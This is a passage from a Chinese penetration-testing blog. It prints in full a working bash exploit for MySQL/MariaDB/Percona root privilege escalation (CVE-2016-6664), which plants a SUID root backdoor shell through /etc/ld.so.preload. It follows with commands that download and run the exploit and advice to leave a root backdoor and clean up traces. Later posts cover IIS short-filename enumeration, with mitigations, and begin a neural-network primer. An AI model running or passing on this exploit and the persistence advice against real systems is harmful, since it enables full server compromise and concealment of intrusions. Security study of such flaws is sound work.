class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash -p</span><br><span class="line">#</span><br><span class="line"># MySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit</span><br><span class="line"># mysql-chowned.sh (ver. 1.0)</span><br><span class="line">#</span><br><span class="line"># CVE-2016-6664 / OCVE-2016-5617</span><br><span class="line">#</span><br><span class="line"># Discovered and coded by:</span><br><span class="line">#</span><br><span class="line"># Dawid Golunski</span><br><span class="line"># dawid[at]legalhackers.com</span><br><span class="line">#</span><br><span class="line"># https://legalhackers.com</span><br><span class="line">#</span><br><span class="line"># Follow https://twitter.com/dawid_golunski for updates on this advisory.</span><br><span class="line">#</span><br><span class="line"># This PoC exploit allows attackers to (instantly) escalate their privileges</span><br><span class="line"># from mysql system account to root through unsafe error log handling.</span><br><span class="line"># The exploit requires that file-based logging has been configured (default).</span><br><span class="line"># To confirm that syslog logging has not been enabled instead use:</span><br><span class="line"># grep -r syslog /etc/mysql</span><br><span class="line"># which should return no results.</span><br><span class="line">#</span><br><span class="line"># This exploit can be chained with the following vulnerability:</span><br><span class="line"># CVE-2016-6663 / OCVE-2016-5616</span><br><span class="line"># which allows attackers to gain access to mysql system account (mysql shell).</span><br><span class="line">#</span><br><span class="line"># In case database server has been configured with syslog you may also use:</span><br><span class="line"># CVE-2016-6662 as an alternative to this exploit.</span><br><span class="line">#</span><br><span class="line"># Usage:</span><br><span class="line"># ./mysql-chowned.sh path_to_error.log </span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># See the full advisory for details at:</span><br><span class="line"># https://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</span><br><span class="line">#</span><br><span class="line"># Video PoC:</span><br><span class="line"># https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-6663-5616-6664-5617-Exploits.html</span><br><span class="line">#</span><br><span class="line"># Disclaimer:</span><br><span class="line"># For testing purposes only. Do no harm.</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">BACKDOORSH=&quot;/bin/bash&quot;</span><br><span class="line">BACKDOORPATH=&quot;/tmp/mysqlrootsh&quot;</span><br><span class="line">PRIVESCLIB=&quot;/tmp/privesclib.so&quot;</span><br><span class="line">PRIVESCSRC=&quot;/tmp/privesclib.c&quot;</span><br><span class="line">SUIDBIN=&quot;/usr/bin/sudo&quot;</span><br><span class="line"></span><br><span class="line">function cleanexit &#123;</span><br><span class="line">    # Cleanup </span><br><span class="line">    echo -e &quot;\n[+] Cleaning up...&quot;</span><br><span class="line">    rm -f $PRIVESCSRC</span><br><span class="line">    rm -f $PRIVESCLIB</span><br><span class="line">    rm -f $ERRORLOG</span><br><span class="line">    touch $ERRORLOG</span><br><span class="line">    if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">        echo -n &gt; /etc/ld.so.preload</span><br><span class="line">    fi</span><br><span class="line">    echo -e &quot;\n[+] Job done. Exiting with code $1 \n&quot;</span><br><span class="line">    exit $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function ctrl_c() &#123;</span><br><span class="line">        echo -e &quot;\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.&quot;</span><br><span class="line">    cleanexit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#intro </span><br><span class="line">echo -e &quot;\033[94m \nMySQL / MariaDB / PerconaDB - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / OCVE-2016-5617\n&quot;</span><br><span class="line">echo -e &quot;Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m&quot;</span><br><span class="line"></span><br><span class="line"># Args</span><br><span class="line">if [ $# -lt 1 ]; then</span><br><span class="line">    echo -e &quot;\n[!] Exploit usage: \n\n$0 path_to_error.log \n&quot;</span><br><span class="line">    echo -e &quot;It seems that this server uses: `ps aux | grep mysql | awk -F&apos;log-error=&apos; &apos;&#123; print $2 &#125;&apos; | cut -d&apos; &apos; -f1 | grep &apos;/&apos;`\n&quot;</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Priv check</span><br><span class="line"></span><br><span class="line">echo -e &quot;\n[+] Starting the exploit as \n\033[94m`id`\033[0m&quot;</span><br><span class="line">id | grep -q mysql </span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e &quot;\n[!] You need to execute the exploit as mysql user! Exiting.\n&quot;</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Set target paths</span><br><span class="line">ERRORLOG=&quot;$1&quot;</span><br><span class="line">if [ ! -f $ERRORLOG ]; then</span><br><span class="line">    echo -e &quot;\n[!] The specified MySQL catalina.out log ($ERRORLOG) doesn&apos;t exist. Try again.\n&quot;</span><br><span class="line">    exit 3</span><br><span class="line">fi</span><br><span class="line">echo -e &quot;\n[+] Target MySQL log file set to $ERRORLOG&quot;</span><br><span class="line"></span><br><span class="line"># [ Active exploitation ]</span><br><span class="line"></span><br><span class="line">trap ctrl_c INT</span><br><span class="line"># Compile privesc preload library</span><br><span class="line">echo -e &quot;\n[+] Compiling the privesc shared library ($PRIVESCSRC)&quot;</span><br><span class="line">cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">       #include &lt;sys/types.h&gt;</span><br><span class="line">       #include &lt;sys/stat.h&gt;</span><br><span class="line">       #include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">uid_t geteuid(void) &#123;</span><br><span class="line">    static uid_t  (*old_geteuid)();</span><br><span class="line">    old_geteuid = dlsym(RTLD_NEXT, &quot;geteuid&quot;);</span><br><span class="line">    if ( old_geteuid() == 0 ) &#123;</span><br><span class="line">        chown(&quot;$BACKDOORPATH&quot;, 0, 0);</span><br><span class="line">        chmod(&quot;$BACKDOORPATH&quot;, 04777);</span><br><span class="line">        //unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return old_geteuid();</span><br><span class="line">&#125;</span><br><span class="line">_solibeof_</span><br><span class="line">/bin/bash -c &quot;gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl&quot;</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e &quot;\n[!] Failed to compile the privesc lib $PRIVESCSRC.&quot;</span><br><span class="line">    cleanexit 2;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Prepare backdoor shell</span><br><span class="line">cp $BACKDOORSH $BACKDOORPATH</span><br><span class="line">echo -e &quot;\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`&quot;</span><br><span class="line"></span><br><span class="line"># Safety check</span><br><span class="line">if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">    echo -e &quot;\n[!] /etc/ld.so.preload already exists. Exiting for safety.&quot;</span><br><span class="line">    exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Symlink the log file to /etc</span><br><span class="line">rm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOG</span><br><span class="line">if [ $? -ne 0 ]; then</span><br><span class="line">    echo -e &quot;\n[!] Couldn&apos;t remove the $ERRORLOG file or create a symlink.&quot;</span><br><span class="line">    cleanexit 3</span><br><span class="line">fi</span><br><span class="line">echo -e &quot;\n[+] Symlink created at: \n`ls -l $ERRORLOG`&quot;</span><br><span class="line"></span><br><span class="line"># Wait for MySQL to re-open the logs</span><br><span class="line">echo -ne &quot;\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n&quot;</span><br><span class="line">read -p &quot;Do you want to kill mysqld process to instantly get root? :) ? [y/n] &quot; THE_ANSWER</span><br><span class="line">if [ &quot;$THE_ANSWER&quot; = &quot;y&quot; ]; then</span><br><span class="line">    echo -e &quot;Got it. Executing &apos;killall mysqld&apos; now...&quot;</span><br><span class="line">    killall mysqld</span><br><span class="line">fi</span><br><span class="line">while :; do </span><br><span class="line">    sleep 0.1</span><br><span class="line">    if [ -f /etc/ld.so.preload ]; then</span><br><span class="line">        echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><br><span class="line">        rm -f $ERRORLOG</span><br><span class="line">        break;</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"># /etc/    dir should be owned by mysql user at this point</span><br><span class="line"># Inject the privesc.so shared library to escalate privileges</span><br><span class="line">echo $PRIVESCLIB &gt; /etc/ld.so.preload</span><br><span class="line">echo -e &quot;\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`&quot;</span><br><span class="line">echo -e &quot;\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload&quot;</span><br><span class="line">echo -e &quot;\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`&quot;</span><br><span class="line">chmod 755 /etc/ld.so.preload</span><br><span class="line"></span><br><span class="line"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span><br><span class="line">echo -e &quot;\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!&quot;</span><br><span class="line">sudo 2&gt;/dev/null &gt;/dev/null</span><br><span class="line"></span><br><span class="line">#while :; do </span><br><span class="line">#    sleep 0.1</span><br><span class="line">#    ps aux | grep mysqld | grep -q &apos;log-error&apos;</span><br><span class="line">#    if [ $? -eq 0 ]; then</span><br><span class="line">#        break;</span><br><span class="line">#    fi</span><br><span class="line">#done</span><br><span class="line"></span><br><span class="line"># Check for the rootshell</span><br><span class="line">ls -l $BACKDOORPATH</span><br><span class="line">ls -l $BACKDOORPATH | grep rws | grep -q root</span><br><span class="line">if [ $? -eq 0 ]; then </span><br><span class="line">    echo -e &quot;\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`&quot;</span><br><span class="line">    echo -e &quot;\n\033[94mGot root! The database server has been ch-OWNED !\033[0m&quot;</span><br><span class="line">else</span><br><span class="line">    echo -e &quot;\n[!] Failed to get root&quot;</span><br><span class="line">    cleanexit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Execute the rootshell</span><br><span class="line">echo -e &quot;\n[+] Spawning the rootshell $BACKDOORPATH now! \n&quot;</span><br><span class="line">$BACKDOORPATH -p -c &quot;rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB&quot;</span><br><span class="line">$BACKDOORPATH -p</span><br><span class="line"></span><br><span class="line"># Job done.</span><br><span class="line">cleanexit 0</span><br></pre></td></tr></table></figure></p>
-<p>然后我们在刚才mysql权限的shell中下载提权脚本并执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh</span><br><span class="line">chmod 777 mysql-chowned.sh</span><br><span class="line">./mysql-chowned.sh /var/log/mysql/error.log</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv13.png?raw=true" alt=""></p>
-<p>成功得到root权限</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv14.png?raw=true" alt=""></p>
-<p>接下来利用root账户留后门，清理痕迹即可。</p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>数据库提权是后渗透阶段非常常用的提权方式，做渗透测试时，数据库是重要的突破点，只有我们对这些漏洞有一定的积累，才能面对不同的情况利用不同的漏洞。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/28/IIS短文件名漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/06/28/IIS短文件名漏洞/" itemprop="url">
-                  IIS短文件名漏洞
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-28T11:39:37+08:00">
-                2018-06-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/06/28/IIS短文件名漏洞/" class="leancloud_visitors" data-flag-title="IIS短文件名漏洞">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-IIS短文件名"><a href="#0x00-IIS短文件名" class="headerlink" title="0x00 IIS短文件名"></a>0x00 IIS短文件名</h2><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的DOS 8.3 短文件名。</p>
-<p>Windows下查看对应的短文件名，可以使用命令 dir /x</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename01.png?raw=true" alt=""></p>
-<p>对应短文件名的规律是：</p>
-<ul>
-<li>前六位保留</li>
-<li>所有小写字母均转换成大写字母</li>
-<li>后续字符用~1表示</li>
-<li>后缀最多显示三位，其余的被截断</li>
-<li>长文件名前缀/文件夹名字符长度符合0-9和Aa-Zz范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件</li>
-</ul>
-<h2 id="0x01-IIS短文件名漏洞"><a href="#0x01-IIS短文件名漏洞" class="headerlink" title="0x01 IIS短文件名漏洞"></a>0x01 IIS短文件名漏洞</h2><p>在IIS的web服务中，有时无法直接访问一些文件，但是我们发送一个存在通配符* 和?的请求,当IIS接收到一个文件路径中包含~的请求时，根据文件是否存在返回值是不同的，我们可以利用这个方法猜解本来无法得到的文件名。</p>
-<ul>
-<li><p>访问构造的某个存在的短文件名，会返回404</p>
-</li>
-<li><p>访问构造的某个不存在的短文件名，会返回400</p>
-</li>
-</ul>
-<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>本来受到IIS短文件名漏洞影响的版本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IIS 1.0，Windows NT 3.51  </span><br><span class="line">IIS 3.0，Windows NT 4.0 Service Pack 2  </span><br><span class="line">IIS 4.0，Windows NT 4.0选项包 </span><br><span class="line">IIS 5.0，Windows 2000  </span><br><span class="line">IIS 5.1，Windows XP Professional和Windows XP Media Center Edition  </span><br><span class="line">IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition  </span><br><span class="line">IIS 7.0，Windows Server 2008和Windows Vista  </span><br><span class="line">IIS 7.5，Windows 7（远程启用&lt;customErrors&gt;或没有web.config）</span><br><span class="line">IIS 7.5，Windows 2008（经典管道模式）</span><br><span class="line">注意：IIS使用.Net Framework 4时不受影响</span><br></pre></td></tr></table></figure></p>
-<p>以上受影响范围主要是针对HTTP GET方法，且需要同时安装ASP.NET应用程序。</p>
-<p>但是漏洞发现者Soroush Dalili之后再次在IIS7.5和IIS8.0的版本中发现，当使用OPTIONS来代替GET 方法时，如果请求中的短文件名是存在的，IIS会返回一个不一样的错误信息。</p>
-<p>而且在之后的版本中此漏洞也都成功验证。<br>所以影响的版本又加上了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IIS 8.0，Windows 8, Windows Server 2012</span><br><span class="line">IIS 8.5，Windows 8.1,Windows Server 2012 R2</span><br><span class="line">IIS 10.0，Windows 10, Windows Server 2016</span><br></pre></td></tr></table></figure></p>
-<p>所以，短文件名漏洞存在于目前IIS的所有版本中。</p>
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="在windows10下打开IIS服务"><a href="#在windows10下打开IIS服务" class="headerlink" title="在windows10下打开IIS服务"></a>在windows10下打开IIS服务</h3><p>开始—–&gt;控制面板—-&gt;程序—-&gt;启用或关闭windows功能，勾选以下选项，安装IIS。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename02.png?raw=true" alt=""></p>
-<p>在浏览器访问ip地址，如果发现IIS windows信息说明安装成功。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename03.png?raw=true" alt=""></p>
-<p>IIS 安装成功以后，会默认在C盘目录下生成intpub目录，网站的根目录位于C:\inetpub\wwwroot，此时我们创建几个asp文件之后，再使用dir /x查看下根目录是否存在短文件名</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/iis_shortfilename/short_filename04.png?raw=true" alt=""></p>
-<p>我们可以看到，有的文件有短文件名，有的文件没有，这是因为之前提到的，长文件名前缀/文件夹名字符长度符合0-9和Aa-Zz范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件。</p>
-<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>常用的利用方式有以下几种</p>
-<h3 id="短文件名泄露"><a href="#短文件名泄露" class="headerlink" title="短文件名泄露"></a>短文件名泄露</h3><p>我们可以写python脚本通过HTTP的OPTIONS方法爆破文件名，也可以下载专用的爆破工具来扫描。</p>
-<h3 id="apache下通过短文件名下载"><a href="#apache下通过短文件名下载" class="headerlink" title="apache下通过短文件名下载"></a>apache下通过短文件名下载</h3><p>当Apache运行在windows下，如果创建了一个长文件，那么无需猜解长文件，直接用短文件就可以下载了。</p>
-<h3 id="Net-Framework的拒绝服务攻击"><a href="#Net-Framework的拒绝服务攻击" class="headerlink" title="Net Framework的拒绝服务攻击"></a>Net Framework的拒绝服务攻击</h3><p>当请求文件夹名称包含~1的请求，会导致不存在该文件的.Net framework去递归所有根目录。特别是第一次请求时，会造成的文件读取特别多。用僵尸网络不断向服务器发送此类请求，很容易耗尽对方服务器资源。</p>
-<h2 id="0x05-局限性"><a href="#0x05-局限性" class="headerlink" title="0x05 局限性"></a>0x05 局限性</h2><ul>
-<li><p>1.此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解</p>
-</li>
-<li><p>2.如果文件名本身太短（无短文件名）也是无法猜解的</p>
-</li>
-<li><p>3.如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配</p>
-</li>
-<li><p>4.如果文件夹名前6位字符带点“.”，扫描程序会认为是文件而不是文件夹，最终出现误报</p>
-</li>
-<li><p>5.不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测</p>
-</li>
-</ul>
-<h2 id="0x06-应对"><a href="#0x06-应对" class="headerlink" title="0x06 应对"></a>0x06 应对</h2><h4 id="禁止url中使用“-”或它的Unicode编码"><a href="#禁止url中使用“-”或它的Unicode编码" class="headerlink" title="禁止url中使用“~”或它的Unicode编码"></a>禁止url中使用“~”或它的Unicode编码</h4><h4 id="关闭windows的8-3格式功能"><a href="#关闭windows的8-3格式功能" class="headerlink" title="关闭windows的8.3格式功能"></a>关闭windows的8.3格式功能</h4><ul>
-<li><p>命令行中关闭：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsutil 8dot3name set 1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>注册表中禁用：<br>在注册表中找到HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，代表不创建短文件名格式</p>
-</li>
-</ul>
-<h4 id="升级netFramework至4-0以上版本"><a href="#升级netFramework至4-0以上版本" class="headerlink" title="升级netFramework至4.0以上版本"></a>升级netFramework至4.0以上版本</h4><h4 id="修改注册表禁用短文件名功能"><a href="#修改注册表禁用短文件名功能" class="headerlink" title="修改注册表禁用短文件名功能"></a>修改注册表禁用短文件名功能</h4><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>相对来说这个漏洞比较鸡肋，微软也表示IIS短文件漏洞未达到安全更新标准，需要确定何时在下一个逻辑版本中解决它。</p>
-<p>虽然漏洞的威胁不大，但是正因不严重导致微软没有更新，现在所有版本都存在这个问题，当有人将其与其他漏洞配合起来使用时，也是有可能造成很严重的后果。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/27/机器学习-4-——神经网络/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/06/27/机器学习-4-——神经网络/" itemprop="url">
-                  机器学习(4)——神经网络
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-27T13:50:05+08:00">
-                2018-06-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/机器学习/" itemprop="url" rel="index">
-                    <span itemprop="name">机器学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/06/27/机器学习-4-——神经网络/" class="leancloud_visitors" data-flag-title="机器学习(4)——神经网络">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-神经网络"><a href="#0x00-神经网络" class="headerlink" title="0x00 神经网络"></a>0x00 神经网络</h2><p>人工神经网络（Artificial Neural Network，缩写ANN），简称神经网络（Neural Network，缩写NN），是一种模仿生物神经网络(动物的中枢神经系统，特别是大脑)的结构和功能的数学模型或计算模型，用于对函数进行估计或近似。</p>
-<h2 id="0x01-神经元"><a href="#0x01-神经元" class="headerlink" title="0x01 神经元"></a>0x01 神经元</h2><p>一个神经元通常具有多个树突，主要用来接受传入信息；而轴突只有一条，轴突尾端有许多轴突末梢可以给其他多个神经元传递信息。轴突末梢跟其他神经元的树突产生连接，从而传递信号。这个连接的位置在生物学上叫做“突触”。</p>
-<p>人脑中神经元如图：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_01.png?raw=true" alt=""></p>
-<h2 id="0x02-神经元的数学模型"><a href="#0x02-神经元的数学模型" class="headerlink" title="0x02 神经元的数学模型"></a>0x02 神经元的数学模型</h2><p>神经元模型是一个包含输入，输出与计算功能的模型。输入可以类比为神经元的树突，而输出可以类比为神经元的轴突，计算则可以类比为细胞核。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_02.png?raw=true" alt=""></p>
-<p>每个连线上都会分配一个权值，在数据传向下一层的时候要乘以对应的权值。在神经网络中，每个箭头表示值的加权传递。</p>
-<p>如果我们将神经元图中的所有变量用符号表示，并且写出输出的计算公式，就会得到：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml4_03.png?raw=true" alt=""></p>
-<p>z是在输入和权值的线性加权和叠加了一个激活函数g的值。在MP模型里，函数g是sgn函数，也就是取符号函数。这个函数当输入大于0时，输出1，否则输出-1。</p>
